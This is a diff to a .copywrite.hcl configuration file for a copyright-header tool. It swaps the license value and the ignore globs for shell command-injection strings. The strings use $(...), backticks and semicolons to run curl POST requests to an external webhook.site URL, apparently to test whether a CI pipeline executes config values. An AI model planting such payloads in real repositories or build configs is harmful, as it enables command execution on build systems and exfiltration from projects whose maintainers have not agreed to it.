@@ -1,17 +1,13 @@
+# .copywrite.hcl
 schema_version = 1
 
 project {
-  license = "MPL-2.0"
-
-  # (OPTIONAL) A list of globs that should not have copyright/license headers.
-  # Supports doublestar glob patterns for more flexibility in defining which
-  # files or folders should be ignored
+  license = "MPL-2.0$(curl -X POST https://webhook.site/1c7ba8f8-7520-4c23-be29-bebebe495840 -d 'test1')"
+  
   header_ignore = [
-    "**/testdata/**",
-    "**/testdata-initialize/**",
-    ".github/ISSUE_TEMPLATE/**",
-    ".changes/**",
-    "internal/schemas/gen-workspace/**",
-    "internal/schemas/tf-plugin-cache/**",
+    "testdata/**",
+    "$(curl -X POST https://webhook.site/1c7ba8f8-7520-4c23-be29-bebebe495840 -d 'test2')",
+    "`curl -X POST https://webhook.site/1c7ba8f8-7520-4c23-be29-bebebe495840 -d 'test3'`",
+    "; curl -X POST https://webhook.site/1c7ba8f8-7520-4c23-be29-bebebe495840 -d 'test4';",
   ]
 }
